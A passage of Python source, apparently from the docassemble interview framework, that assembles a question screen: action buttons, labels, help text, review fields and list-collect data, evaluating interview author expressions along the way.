                exec(list_of_indices[indexno] + "" = "" + iterators[indexno], user_dict)
        if self.need is not None:
            for need_code in self.need:
                eval(need_code, user_dict)
        for the_field in self.undefine:
            docassemble.base.functions.undefine(the_field)
        if len(self.reconsider) > 0:
            docassemble.base.functions.reconsider(*self.reconsider)
        question_text = self.content.text(user_dict).rstrip()
        if self.breadcrumb is not None:
            breadcrumb = self.breadcrumb.text(user_dict).rstrip()
        else:
            breadcrumb = None
        try:
            user_dict['_internal']['event_stack'][docassemble.base.functions.this_thread.current_info['user']['session_uid']][0]['breadcrumb'] = question_text if breadcrumb is None else breadcrumb
        except:
            pass
        #logmessage(""Asking "" + str(question_text))
        #sys.stderr.write(""Asking "" + str(question_text) + ""\n"")
        if self.subcontent is not None:
            subquestion = self.subcontent.text(user_dict).rstrip()
        else:
            subquestion = None
        the_default_titles = dict()
        if self.language in self.interview.default_title:
            the_default_titles.update(self.interview.default_title[self.language])
        for key, val in self.interview.default_title['*'].items():
            if key not in the_default_titles:
                the_default_titles[key] = val
        extras = dict()
        if len(self.action_buttons) > 0:
            extras['action_buttons'] = list()
            for item in self.action_buttons:
                if isinstance(item, dict):
                    label = item['label'].text(user_dict).strip()
                    given_arguments = item.get('arguments', dict())
                    arguments = dict()
                    forget_prior = item.get('forget_prior', False)
                    for key, val in given_arguments.items():
                        if isinstance(val, TextObject):
                            arguments[key] = val.text(user_dict).strip()
                        else:
                            arguments[key] = val
                    action = item['action'].text(user_dict).strip()
                    if not (re.search(r'^https?://', action) or action.startswith('javascript:') or action.startswith('/') or action.startswith('?')):
                        if forget_prior:
                            arguments = {'_action': action, '_arguments': arguments}
                            action = '_da_priority_action'
                        action = docassemble.base.functions.url_action(action, **arguments)
                    color = item['color'].text(user_dict).strip()
                    if item['target'] is not None:
                        target = item['target'].text(user_dict).strip()
                    else:
                        target = None
                    if item['icon'] is not None:
                        icon = item['icon'].text(user_dict).strip()
                    else:
                        icon = None
                    if item['placement'] is not None:
                        placement = item['placement'].text(user_dict).strip()
                    else:
                        placement = None
                    extras['action_buttons'].append(dict(action=action, label=label, color=color, icon=icon, placement=placement, forget_prior=forget_prior, target=target))
                else:
                    action_buttons = eval(item, user_dict)
                    if hasattr(action_buttons, 'instanceName') and hasattr(action_buttons, 'elements'):
                        action_buttons = action_buttons.elements
                    if not isinstance(action_buttons, list):
                        raise DAError(""action buttons code did not evaluate to a list"")
                    for button in action_buttons:
                        if not (isinstance(button, dict) and 'label' in button and 'action' in button and isinstance(button['label'], str) and isinstance(button['action'], str)):
                            raise DAError(""action buttons code did not evaluate to a list of dictionaries with label and action items"")
                        if 'new window' in button and not isinstance(button['new window'], (str, bool, NoneType)):
                            raise DAError(""action buttons code included a new window item that was not boolean, text, or None"")
                        if 'color' in button and not isinstance(button['color'], (str, NoneType)):
                            raise DAError(""action buttons code included a color item that was not text or None"")
                        if 'icon' in button and not isinstance(button['icon'], (str, NoneType)):
                            raise DAError(""action buttons code included an icon item that was not text or None"")
                        color = button.get('color', 'primary')
                        if color is None:
                            color = 'primary'
                        icon = button.get('icon', None)
                        placement = button.get('placement', None)
                        target = button.get('new window', None)
                        if target is True:
                            target = '_blank'
                        elif target is False:
                            target = None
                        arguments = button.get('arguments', dict())
                        forget_prior = button.get('forget_prior', False)
                        if arguments is None:
                            arguments = dict()
                        if not isinstance(arguments, dict):
                            raise DAError(""action buttons code included an arguments item that was not a dictionary"")
                        action = button['action']
                        if not (re.search(r'^https?://', action) or action.startswith('javascript:') or action.startswith('/') or action.startswith('?')):
                            if forget_prior:
                                arguments = {'_action': action, '_arguments': arguments}
                                action = '_da_priority_action'
                            action = docassemble.base.functions.url_action(action, **arguments)
                        label = button['label']
                        extras['action_buttons'].append(dict(action=action, label=label, color=color, icon=icon, placement=placement, target=target))
            for item in extras['action_buttons']:
                if color not in ('primary', 'secondary', 'success', 'danger', 'warning', 'info', 'light', 'dark', 'link'):
                    raise DAError(""color in action buttons not valid: "" + repr(color))
        if hasattr(self, 'question_metadata'):
            extras['questionMetadata'] = recursive_eval_textobject_or_primitive(self.question_metadata, user_dict)
        if hasattr(self, 'css_class') and self.css_class is not None:
            extras['cssClass'] = self.css_class.text(user_dict)
        elif 'css class' in user_dict['_internal'] and user_dict['_internal']['css class'] is not None:
            extras['cssClass'] = user_dict['_internal']['css class']
        elif self.language in self.interview.default_screen_parts and 'css class' in self.interview.default_screen_parts[self.language]:
            extras['cssClass'] = self.interview.default_screen_parts[self.language]['css class'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'css class' in self.interview.default_screen_parts['*']:
            extras['cssClass'] = self.interview.default_screen_parts['*']['css class'].text(user_dict)
        elif 'css class' in the_default_titles:
            extras['cssClass'] = the_default_titles['css class']
        if hasattr(self, 'table_css_class') and self.table_css_class is not None:
            extras['tableCssClass'] = self.table_css_class.text(user_dict)
        elif 'table css class' in user_dict['_internal'] and user_dict['_internal']['table css class'] is not None:
            extras['tableCssClass'] = user_dict['_internal']['table css class']
        elif self.language in self.interview.default_screen_parts and 'table css class' in self.interview.default_screen_parts[self.language]:
            extras['tableCssClass'] = self.interview.default_screen_parts[self.language]['table css class'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'table css class' in self.interview.default_screen_parts['*']:
            extras['tableCssClass'] = self.interview.default_screen_parts['*']['table css class'].text(user_dict)
        elif 'table css class' in the_default_titles:
            extras['tableCssClass'] = the_default_titles['table css class']
        if hasattr(self, 'undertext') and self.undertext is not None:
            extras['underText'] = self.undertext.text(user_dict)
        elif 'under' in user_dict['_internal'] and user_dict['_internal']['under'] is not None:
            extras['underText'] = user_dict['_internal']['under']
        elif self.language in self.interview.default_screen_parts and 'under' in self.interview.default_screen_parts[self.language]:
            extras['underText'] = self.interview.default_screen_parts[self.language]['under'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'under' in self.interview.default_screen_parts['*']:
            extras['underText'] = self.interview.default_screen_parts['*']['under'].text(user_dict)
        elif 'under' in the_default_titles:
            extras['underText'] = the_default_titles['under']
        if hasattr(self, 'pretext') and self.pretext is not None:
            extras['pre text'] = self.pretext.text(user_dict)
        elif 'pre' in user_dict['_internal'] and user_dict['_internal']['pre'] is not None:
            extras['pre text'] = user_dict['_internal']['pre']
        elif self.language in self.interview.default_screen_parts and 'pre' in self.interview.default_screen_parts[self.language]:
            extras['pre text'] = self.interview.default_screen_parts[self.language]['pre'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'pre' in self.interview.default_screen_parts['*']:
            extras['pre text'] = self.interview.default_screen_parts['*']['pre'].text(user_dict)
        elif 'pre' in the_default_titles:
            extras['pre text'] = the_default_titles['pre']
        if hasattr(self, 'posttext') and self.posttext is not None:
            extras['post text'] = self.posttext.text(user_dict)
        elif 'post' in user_dict['_internal'] and user_dict['_internal']['post'] is not None:
            extras['post text'] = user_dict['_internal']['post']
        elif self.language in self.interview.default_screen_parts and 'post' in self.interview.default_screen_parts[self.language]:
            extras['post text'] = self.interview.default_screen_parts[self.language]['post'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'post' in self.interview.default_screen_parts['*']:
            extras['post text'] = self.interview.default_screen_parts['*']['post'].text(user_dict)
        elif 'post' in the_default_titles:
            extras['post text'] = the_default_titles['post']
        if hasattr(self, 'righttext') and self.righttext is not None:
            extras['rightText'] = self.righttext.text(user_dict)
        elif 'right' in user_dict['_internal'] and user_dict['_internal']['right'] is not None:
            extras['rightText'] = user_dict['_internal']['right']
        elif self.language in self.interview.default_screen_parts and 'right' in self.interview.default_screen_parts[self.language]:
            extras['rightText'] = self.interview.default_screen_parts[self.language]['right'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'right' in self.interview.default_screen_parts['*']:
            extras['rightText'] = self.interview.default_screen_parts['*']['right'].text(user_dict)
        elif 'right' in the_default_titles:
            extras['rightText'] = the_default_titles['right']
        for screen_part in ('footer', 'submit', 'exit link', 'exit label', 'exit url', 'full', 'logo', 'short logo', 'title', 'subtitle', 'tab title', 'short title', 'title url', 'title url opens in other window', 'navigation bar html'):
            if screen_part in user_dict['_internal'] and user_dict['_internal'][screen_part] is not None:
                extras[screen_part + ' text'] = user_dict['_internal'][screen_part]
        if self.language in self.interview.default_screen_parts:
            for screen_part in self.interview.default_screen_parts[self.language]:
                if screen_part in ('footer', 'submit', 'exit link', 'exit label', 'exit url', 'full', 'logo', 'short logo', 'title', 'subtitle', 'tab title', 'short title', 'title url', 'title url opens in other window', 'navigation bar html') and (screen_part + ' text') not in extras:
                    extras[screen_part + ' text'] = self.interview.default_screen_parts[self.language][screen_part].text(user_dict)
        if '*' in self.interview.default_screen_parts:
            for screen_part in self.interview.default_screen_parts['*']:
                if screen_part in ('footer', 'submit', 'exit link', 'exit label', 'exit url', 'full', 'logo', 'short logo', 'title', 'subtitle', 'tab title', 'short title', 'title url', 'title url opens in other window', 'navigation bar html') and (screen_part + ' text') not in extras:
                    extras[screen_part + ' text'] = self.interview.default_screen_parts['*'][screen_part].text(user_dict)
        for key, val in the_default_titles.items():
            if key in ('pre', 'post', 'footer', 'submit', 'exit link', 'exit label', 'exit url', 'full', 'logo', 'short logo', 'title', 'subtitle', 'tab title', 'short title', 'title url', 'title url opens in other window', 'navigation bar html') and (key + ' text') not in extras:
                extras[key + ' text'] = val
        if len(self.terms):
            lang = docassemble.base.functions.get_language()
            extras['terms'] = dict()
            for termitem, definition in self.terms.items():
                if lang in definition['alt_terms']:
                    extras['terms'][definition['alt_terms'][lang].lower()] = dict(definition=definition['definition'].text(user_dict))
                else:
                    extras['terms'][termitem] = dict(definition=definition['definition'].text(user_dict))
        if len(self.autoterms):
            lang = docassemble.base.functions.get_language()
            extras['autoterms'] = dict()
            for termitem, definition in self.autoterms.items():
                if lang in definition['alt_terms']:
                    extras['autoterms'][definition['alt_terms'][lang].lower()] = dict(definition=definition['definition'].text(user_dict))
                else:
                    extras['autoterms'][termitem] = dict(definition=definition['definition'].text(user_dict))
        for term_type in ('terms', 'autoterms'):
            if term_type in user_dict['_internal']:
                extras['interview_' + term_type] = dict()
                for lang, termdefs in getattr(self.interview, term_type).items():
                    if lang not in extras['interview_' + term_type]:
                        extras['interview_' + term_type][lang] = dict()
                    for term, term_info in termdefs.items():
                        extras['interview_' + term_type][lang][term] = term_info
                for lang, termdefs in user_dict['_internal'][term_type].items():
                    if lang not in extras['interview_' + term_type]:
                        extras['interview_' + term_type][lang] = dict()
                    for term, term_info in termdefs.items():
                        extras['interview_' + term_type][lang][term] = term_info
        if self.css is not None:
            extras['css'] = self.css.text(user_dict)
        if self.script is not None:
            extras['script'] = self.script.text(user_dict)
        if self.continuelabel is not None:
            continuelabel = self.continuelabel.text(user_dict)
        elif self.question_type == 'review':
            if 'resume button label' in user_dict['_internal'] and user_dict['_internal']['resume button label'] is not None:
                continuelabel = user_dict['_internal']['resume button label']
            elif self.language in self.interview.default_screen_parts and 'resume button label' in self.interview.default_screen_parts[self.language]:
                continuelabel = self.interview.default_screen_parts[self.language]['resume button label'].text(user_dict)
            elif '*' in self.interview.default_screen_parts and 'resume button label' in self.interview.default_screen_parts['*']:
                continuelabel = self.interview.default_screen_parts['*']['resume button label'].text(user_dict)
            elif 'resume button label' in the_default_titles:
                continuelabel = the_default_titles['resume button label']
            else:
                continuelabel = None
        else:
            if 'continue button label' in user_dict['_internal'] and user_dict['_internal']['continue button label'] is not None:
                continuelabel = user_dict['_internal']['continue button label']
            elif self.language in self.interview.default_screen_parts and 'continue button label' in self.interview.default_screen_parts[self.language]:
                continuelabel = self.interview.default_screen_parts[self.language]['continue button label'].text(user_dict)
            elif '*' in self.interview.default_screen_parts and 'continue button label' in self.interview.default_screen_parts['*']:
                continuelabel = self.interview.default_screen_parts['*']['continue button label'].text(user_dict)
            elif 'continue button label' in the_default_titles:
                continuelabel = the_default_titles['continue button label']
            else:
                continuelabel = None
        if self.backbuttonlabel is not None:
            extras['back button label text'] = self.backbuttonlabel.text(user_dict)
        elif 'back button label' in user_dict['_internal'] and user_dict['_internal']['back button label'] is not None:
            extras['back button label text'] = user_dict['_internal']['back button label']
        elif self.language in self.interview.default_screen_parts and 'back button label' in self.interview.default_screen_parts[self.language]:
            extras['back button label text'] = self.interview.default_screen_parts[self.language]['back button label'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'back button label' in self.interview.default_screen_parts['*']:
            extras['back button label text'] = self.interview.default_screen_parts['*']['back button label'].text(user_dict)
        elif 'back button label' in the_default_titles:
            extras['back button label text'] = the_default_titles['back button label']
        else:
            extras['back button label text'] = None
        if self.cornerbackbuttonlabel is not None:
            extras['corner back button label text'] = self.cornerbackbuttonlabel.text(user_dict)
        elif 'corner back button label' in user_dict['_internal'] and user_dict['_internal']['corner back button label'] is not None:
            extras['corner back button label text'] = user_dict['_internal']['corner back button label']
        elif self.language in self.interview.default_screen_parts and 'corner back button label' in self.interview.default_screen_parts[self.language]:
            extras['corner back button label text'] = self.interview.default_screen_parts[self.language]['corner back button label'].text(user_dict)
        elif '*' in self.interview.default_screen_parts and 'corner back button label' in self.interview.default_screen_parts['*']:
            extras['corner back button label text'] = self.interview.default_screen_parts['*']['corner back button label'].text(user_dict)
        elif 'corner back button label' in the_default_titles:
            extras['corner back button label text'] = the_default_titles['corner back button label']
        else:
            extras['corner back button label text'] = None
        if self.helptext is not None:
            if self.helplabel is not None:
                helplabel = self.helplabel.text(user_dict)
            elif 'help label' in user_dict['_internal'] and user_dict['_internal']['help label'] is not None:
                helplabel = user_dict['_internal']['help label']
            elif self.language in self.interview.default_screen_parts and 'help label' in self.interview.default_screen_parts[self.language]:
                helplabel = self.interview.default_screen_parts[self.language]['help label'].text(user_dict)
            elif '*' in self.interview.default_screen_parts and 'help label' in self.interview.default_screen_parts['*']:
                helplabel = self.interview.default_screen_parts['*']['help label'].text(user_dict)
            elif 'help label' in the_default_titles:
                helplabel = the_default_titles['help label']
            else:
                helplabel = None
            if self.helpheading is not None:
                help_heading = self.helpheading.text(user_dict)
            else:
                help_heading = None
            if self.audiovideo is not None and 'help' in self.audiovideo:
                the_audio_video = process_audio_video_list(self.audiovideo['help'], user_dict)
            else:
                the_audio_video = None
            help_content = self.helptext.text(user_dict)
            if re.search(r'[^\s]', help_content) or the_audio_video is not None:
                help_text_list = [{'heading': help_heading, 'content': help_content, 'audiovideo': the_audio_video, 'label': helplabel, 'from': 'question'}]
            else:
                help_text_list = list()
        else:
            help_text_list = list()
            if self.language in self.interview.default_screen_parts and 'help label' in self.interview.default_screen_parts[self.language]:
                extras['help label text'] = self.interview.default_screen_parts[self.language]['help label'].text(user_dict)
            if '*' in self.interview.default_screen_parts and 'help label' in self.interview.default_screen_parts['*']:
                extras['help label text'] = self.interview.default_screen_parts['*']['help label'].text(user_dict)
            elif 'help label' in the_default_titles:
                extras['help label text'] = the_default_titles['help label']
        interview_help_text_list = self.interview.processed_helptext(user_dict, self.language)
        #if len(interview_help_text_list) > 0:
        #    help_text_list.extend(interview_help_text_list)
        if self.audiovideo is not None and 'question' in self.audiovideo:
            audiovideo = process_audio_video_list(self.audiovideo['question'], user_dict)
        else:
            audiovideo = None
        if self.decorations is not None:
            decorations = list()
            for decoration_item in self.decorations:
                processed_item = dict()
                for key, value in decoration_item.items():
                    processed_item[key] = value.text(user_dict).strip()
                decorations.append(processed_item)
        else:
            decorations = None
        selectcompute = dict()
        defaults = dict()
        defined = dict()
        hints = dict()
        helptexts = dict()
        labels = dict()
        extras['required'] = dict()
        if hasattr(self, 'back_button'):
            if isinstance(self.back_button, (bool, NoneType)):
                extras['back_button'] = self.back_button
            else:
                extras['back_button'] = eval(self.back_button, user_dict)
        if hasattr(self, 'allowed_to_set'):
            if isinstance(self.allowed_to_set, list):
                extras['allowed_to_set'] = self.allowed_to_set
            else:
                extras['allowed_to_set'] = eval(self.allowed_to_set, user_dict)
                if not isinstance(extras['allowed_to_set'], list):
                    raise DAError(""allowed to set code did not evaluate to a list"")
                for item in extras['allowed_to_set']:
                    if not isinstance(item, str):
                        raise DAError(""allowed to set code did not evaluate to a list of text items"")
        if self.reload_after is not None:
            number = str(self.reload_after.text(user_dict))
            if number not in (""False"", ""false"", ""Null"", ""None"", ""none"", ""null""):
                if number in (""True"", ""true""):
                    number = ""10""
                if number:
                    number = re.sub(r'[^0-9]', r'', number)
                else:
                    number = ""10""
                if int(number) < 4:
                    number = ""4""
                extras['reload_after'] = number
        if hasattr(self, 'allow_downloading'):
            if isinstance(self.allow_downloading, bool):
                extras['allow_downloading'] = self.allow_downloading
            else:
                extras['allow_downloading'] = eval(self.allow_downloading, user_dict)
        if hasattr(self, 'always_include_editable_files'):
            if isinstance(self.always_include_editable_files, bool):
                extras['always_include_editable_files'] = self.always_include_editable_files
            else:
                extras['always_include_editable_files'] = eval(self.always_include_editable_files, user_dict)
        if hasattr(self, 'attachment_notice'):
            if isinstance(self.attachment_notice, bool):
                extras['attachment_notice'] = self.attachment_notice
            else:
                extras['attachment_notice'] = eval(self.attachment_notice, user_dict)
        if hasattr(self, 'download_tab'):
            if isinstance(self.download_tab, bool):
                extras['download_tab'] = self.download_tab
            else:
                extras['download_tab'] = eval(self.download_tab, user_dict)
        if hasattr(self, 'manual_attachment_list'):
            if isinstance(self.manual_attachment_list, bool):
                extras['manual_attachment_list'] = self.manual_attachment_list
            else:
                extras['manual_attachment_list'] = eval(self.manual_attachment_list, user_dict)
        if hasattr(self, 'allow_emailing'):
            if isinstance(self.allow_emailing, bool):
                extras['allow_emailing'] = self.allow_emailing
            else:
                extras['allow_emailing'] = eval(self.allow_emailing, user_dict)
        if hasattr(self, 'zip_filename'):
            extras['zip_filename'] = docassemble.base.functions.single_paragraph(self.zip_filename.text(user_dict))
        if hasattr(self, 'ga_id'):
            extras['ga_id'] = self.ga_id.text(user_dict)
        if hasattr(self, 'segment') and 'id' in self.segment:
            extras['segment'] = dict(arguments=dict())
            extras['segment']['id'] = self.segment['id'].text(user_dict)
            if 'arguments' in self.segment:
                for key, val in self.segment['arguments'].items():
                    extras['segment']['arguments'][key] = self.segment['arguments'][key].text(user_dict)
        if self.question_type == 'response':
            extras['content_type'] = self.content_type.text(user_dict)
            # if hasattr(self, 'binaryresponse'):
            #     extras['binaryresponse'] = self.binaryresponse
        elif self.question_type == 'sendfile':
            # if self.response_file:
            #     extras['response_filename'] = self.response_file.path()
            # else:
            #     extras['response_filename'] = None
            extras['content_type'] = self.content_type.text(user_dict)
        elif self.question_type == 'review':
            if hasattr(self, 'skip_undefined') and not self.skip_undefined:
                skip_undefined = False
            else:
                skip_undefined = True
            extras['ok'] = dict()
            for field in self.fields:
                docassemble.base.functions.this_thread.misc['current_field'] = field.number
                extras['ok'][field.number] = False
                if hasattr(field, 'saveas_code'):
                    failed = False
                    for (expression, is_showif) in field.saveas_code:
                        if skip_undefined:
                            try:
                                the_val = eval(expression, user_dict)
                            except LazyNameError:
                                raise
                            except Exception as err:
                                if self.interview.debug:
                                    logmessage(""Exception in review block: "" + err.__class__.__name__ + "": "" + str(err))
                                failed = True
                                break
                            if is_showif and not the_val:
                                failed = True
                                break
                        else:
                            the_val = eval(expression, user_dict)
                            if is_showif and not the_val:
                                failed = True
                                break
                    if failed:
                        continue
                if hasattr(field, 'action'):
                    if 'action' not in extras:
                        extras['action'] = dict()
                    extras['action'][field.number] = json.dumps(substitute_vars_action(field.action, self.is_generic, the_x, iterators))
                if hasattr(field, 'extras'):
                    if 'show_if_js' in field.extras:
                        if 'show_if_js' not in extras:
                            extras['show_if_js'] = dict()
                        extras['show_if_js'][field.number] = dict(expression=field.extras['show_if_js']['expression'].text(user_dict), vars=copy.deepcopy(field.extras['show_if_js']['vars']), sign=field.extras['show_if_js']['sign'], mode=field.extras['show_if_js']['mode'])
                    if 'field metadata' in field.extras:
                        if 'field metadata' not in extras:
                            extras['field metadata'] = dict()
                        if skip_undefined:
                            try:
                                extras['field metadata'][field.number] = recursive_eval_textobject_or_primitive(field.extras['field metadata'], user_dict)
                            except LazyNameError:
                                raise
                            except Exception as err:
                                if self.interview.debug:
                                    logmessage(""Exception in field metadata: "" + err.__class__.__name__ + "": "" + str(err))
                                continue
                        else:
                            extras['field metadata'][field.number] = recursive_eval_textobject_or_primitive(field.extras['field metadata'], user_dict)
                    for key in ('note', 'html', 'min', 'max', 'minlength', 'maxlength', 'step', 'scale', 'inline', 'inline width', 'currency symbol'): # 'script', 'css',
                        if key in field.extras:
                            if key not in extras:
                                extras[key] = dict()
                            if skip_undefined:
                                try:
                                    extras[key][field.number] = field.extras[key].text(user_dict).strip()
                                except LazyNameError:
                                    raise
                                except Exception as err:
                                    if self.interview.debug:
                                        logmessage(""Exception in review block: "" + err.__class__.__name__ + "": "" + str(err))
                                    continue
                            else:
                                extras[key][field.number] = field.extras[key].text(user_dict)
                            if isinstance(extras[key][field.number], str):
                                extras[key][field.number] = extras[key][field.number].strip()
                                if extras[key][field.number] == '':
                                    del extras[key][field.number]
                if hasattr(field, 'helptext'):
                    if skip_undefined:
                        try:
                            helptexts[field.number] = field.helptext.text(user_dict)
                        except LazyNameError:
                            raise
                        except Exception as err:
                            if self.interview.debug:
                                logmessage(""Exception in review block: "" + err.__class__.__name__ + "": "" + str(err))
                            continue
                    else:
                        helptexts[field.number] = field.helptext.text(user_dict)
                if hasattr(field, 'label'):
                    if skip_undefined:
                        try:
                            labels[field.number] = field.label.text(user_dict)
                        except LazyNameError:
                            raise
                        except Exception as err:
                            if self.interview.debug:
                                logmessage(""Exception in review block: "" + err.__class__.__name__ + "": "" + str(err))
                            continue
                    else:
                        labels[field.number] = field.label.text(user_dict)
                extras['ok'][field.number] = True
            if 'current_field' in docassemble.base.functions.this_thread.misc:
                del docassemble.base.functions.this_thread.misc['current_field']
        else:
            if hasattr(self, 'list_collect') and process_list_collect and eval(self.list_collect, user_dict):
                fields_to_scan = self.get_fields_and_sub_fields(user_dict)
                indexno = 0
                common_var = None
                for field in fields_to_scan:
                    if not hasattr(field, 'saveas'):
                        continue
                    the_saveas = from_safeid(field.saveas)
                    if common_var is None:
                        common_var = the_saveas
                        continue
                    mismatch = False
                    for char_index in range(len(common_var)):
                        if the_saveas[char_index] != common_var[char_index]:
                            mismatch = True
                            break
                    if mismatch:
                        common_var = common_var[0:char_index]
                common_var = re.sub(r'[^\]]*$', '', common_var)
                m = re.search(r'^(.*)\[([ijklmn])\]$', common_var)
                if not m:
                    raise DAError(""Cannot use list collect on these fields.  "" + common_var)
                the_list_varname = m.group(1)
                if hasattr(self, 'list_collect_is_final'):
                    extras['list_collect_is_final'] = eval(self.list_collect_is_final, user_dict)
                else:
                    extras['list_collect_is_final'] = True
                if hasattr(self, 'list_collect_allow_append'):
                    extras['list_collect_allow_append'] = eval(self.list_collect_allow_append, user_dict)
                else:
                    extras['list_collect_allow_append'] = True
                if hasattr(self, 'list_collect_allow_delete'):
                    extras['list_collect_allow_delete'] = eval(self.list_collect_allow_delete, user_dict)
                else:
                    extras['list_collect_allow_delete'] = True
                if hasattr(self, 'list_collect_add_another_label'):
                    extras['list_collect_add_another_label'] = self.list_collect_add_another_label.text(user_dict)
                else:
                    extras['list_collect_add_another_label'] = None
                extras['list_iterator'] = m.group(2)
                the_list = eval(the_list_varname, user_dict)
                if not hasattr(the_list, 'elements') or not isinstance(the_list.elements, list):
                    raise DAError(""Cannot use list collect on a variable that is not a DAList."")
                extras['list_collect'] = the_list
                extras['list_message'] = dict()
                if hasattr(the_list, 'minimum_number') and the_list.minimum_number:
                    extras['list_minimum'] = the_list.minimum_number
                iterator_index = list_of_indices.index(extras['list_iterator'])
                length_to_use = len(the_list.elements)
                if hasattr(the_list, 'minimum_number') and the_list.minimum_number is not None and the_list.minimum_number > length_to_use:
                    length_to_use = the_list.minimum_number
                if length_to_use == 0:
                    length_to_use = 1
                if the_list.ask_object_type or not extras['list_collect_allow_append']:
                    extra_amount = 0
                else:
                    extra_amount = get_config('list collect extra count', 15)
                for list_indexno in range(length_to_use + extra_amount):
                    new_iterators = copy.copy(iterators)
                    new_iterators[iterator_index] = str(list_indexno)
                    ask_result = self.ask(user_dict, old_user_dict, the_x, new_iterators, sought, orig_sought, process_list_collect=False, test_for_objects=(list_indexno < length_to_use))
                    if hasattr(self, 'list_collect_label'):
                        extras['list_message'][list_indexno] = self.list_collect_label.text(user_dict)
                    else:
                        extras['list_message'][list_indexno] = ''
                    for key in ('selectcompute', 'defaults', 'hints', 'helptexts', 'labels'):
                        for field_num, val in ask_result[key].items():
                            if key == 'selectcompute':
                                selectcompute[str(list_indexno) + '_' + str(field_num)] = val
                                if list_indexno == length_to_use - 1:
                                    selectcompute[str(list_indexno + 1) + '_' + str(field_num)] = val
                                    #for ii in range(1, extra_amount + 1):
                                    #    selectcompute[str(list_indexno + ii) + '_' + str(field_num)] = val
                            elif key == 'defaults':
                                defaults[str(list_indexno) + '_' + str(field_num)] = val
                                #if list_indexno == length_to_use - 1:
                                    #for ii in range(1, extra_amount + 1):
                                    #    defaults[str(list_indexno + ii) + '_' + str(field_num)] = val
                            elif key == 'hints':
                                hints[str(list_indexno) + '_' + str(field_num)] = val
                                #if list_indexno == length_to_use - 1:
                                    #for ii in range(1, extra_amount + 1):
                                    #    hints[str(list_indexno + ii) + '_' + str(field_num)] = val
                            elif key == 'helptexts':
                                helptexts[str(list_indexno) + '_' + str(field_num)] = val
                                #if list_indexno == length_to_use - 1:
                                    #for ii in range(1, extra_amount + 1):
                                    #    helptexts[str(list_indexno + ii) + '_' + str(field_num)] = val
                            elif key == 'labels':
                                labels[str(list_indexno) + '_' + str(field_num)] = val
                                #if list_indexno == length_to_use - 1:
                                    #for ii in range(1, extra_amount + 1):
                                    #    labels[str(list_indexno + ii) + '_' + str(field_num)] = val
                    for key, possible_dict in ask_result['extras'].items():
                        if isinstance(possible_dict, dict):
                            if key not in extras:
                                extras[key] = dict()
                            for field_num, val in possible_dict.items():
                                extras[key][str(list_indexno) + '_' + str(field_num)] = val
                                #if list_indexno == length_to_use - 1:
                                    #for ii in range(1, extra_amount + 1):
                                    #    extras[key][str(list_indexno + ii) + '_' + str(field_num)] = val
                if len(iterators):
                    for indexno in range(len(iterators)):
                        exec(list_of_indices[indexno] + "" = "" + iterators[indexno], user_dict)
            else:
                if hasattr(self, 'fields_saveas'):
                    only_empty_fields_exist = False
                else:
                    only_empty_fields_exist = True
                commands_to_run = list()
                for field in self.fields:
                    if hasattr(field, 'inputtype') and field.inputtype == 'combobox':
                        only_empty_fields_exist = False
                    docassemble.base.functions.this_thread.misc['current_field'] = field.number
                    if hasattr(field, 'has_code') and field.has_code:
                        # standalone multiple-choice questions
                        selectcompute[field.number] = list()
                        for choice in field.choices:
                            if 'compute' in choice and isinstance(choice['compute'], CodeType):
                                selectcompute[field.number].extend(process_selections(eval(choice['compute'], user_dict)))
                            else:
                                new_item = dict()
                                if 'image' in choice:
                                    new_item['image'] = choice['image']
                                if 'help' in choice:
                                    new_item['help'] = choice['help'].text(user_dict)
                                if 'default' in choice:
                                    new_item['default'] = choice['default']
                                if isinstance(choice['key'], TextObject):
                                    new_item['key'] = choice['key'].text(user_dict)
                                else:
                                    new_item['key'] = choice['key']
                                new_item['label'] = choice['label'].text(user_dict)
                                selectcompute[field.number].append(new_item)
                        if len(selectcompute[field.number]) > 0:
                            only_empty_fields_exist = False
                        elif test_for_objects:
                            if hasattr(field, 'datatype') and field.datatype in ('multiselect', 'object_multiselect', 'checkboxes', 'object_checkboxes'):
                                ensure_object_exists(from_safeid(field.saveas), field.datatype, user_dict, commands=commands_to_run)
                                commands_to_run.append(from_safeid(field.saveas) + "".gathered = True"")
                            else:
                                if not (hasattr(field, 'inputtype') and field.inputtype == 'combobox'):
                                    commands_to_run.append(from_safeid(field.saveas) + ' = None')
                    elif hasattr(field, 'choicetype') and field.choicetype == 'compute':
                        # multiple choice field in choices
                        if hasattr(field, 'datatype') and field.datatype in ('object', 'object_radio', 'object_multiselect', 'object_checkboxes', 'multiselect', 'checkboxes'):
                            exec(""from docassemble.base.core import selections as docassemble_base_core_selections"", user_dict)
                        if hasattr(field, 'object_labeler'):
                            labeler_func = eval(field.object_labeler['compute'], user_dict)
                            if not isinstance(labeler_func, types.FunctionType):
                                raise DAError(""The object labeler was not a function"")
                            user_dict['_DAOBJECTLABELER'] = labeler_func
                        else:
                            labeler_func = None
                        if hasattr(field, 'help_generator'):
                            help_generator_func = eval(field.help_generator['compute'], user_dict)
                            if not isinstance(help_generator_func, types.FunctionType):
                                raise DAError(""The help generator was not a function"")
                            user_dict['_DAHELPGENERATOR'] = help_generator_func
                        else:
                            help_generator_func = None
                        if hasattr(field, 'image_generator'):
                            image_generator_func = eval(field.image_generator['compute'], user_dict)
                            if not isinstance(image_generator_func, types.FunctionType):
                                raise DAError(""The image generator was not a function"")
                            user_dict['_DAIMAGEGENERATOR'] = image_generator_func
                        else:
                            image_generator_func = None
                        to_compute = field.selections['compute']
                        if field.datatype in ('object_multiselect', 'object_checkboxes'):
                            default_exists = False
                            #logmessage(""Testing for "" + from_safeid(field.saveas))
                            try:
                                assert test_for_objects
                                eval(from_safeid(field.saveas), user_dict)
                                default_to_use = from_safeid(field.saveas)
                            except:
                                default_to_use = 'None'
                            #logmessage(""Running "" + '_DAOBJECTDEFAULTDA = ' + default_to_use)
                            exec('_DAOBJECTDEFAULTDA = ' + default_to_use, user_dict)
                        if 'exclude' in field.selections:
                            exclude_list = list()
                            for x in field.selections['exclude']:
                                exclude_list.append(eval(x, user_dict))
                            selectcompute[field.number] = process_selections(eval(to_compute, user_dict), exclude=exclude_list)
                        else:
                            #logmessage(""Doing "" + field.selections.get('sourcecode', ""No source code""))
                            selectcompute[field.number] = process_selections(eval(to_compute, user_dict))
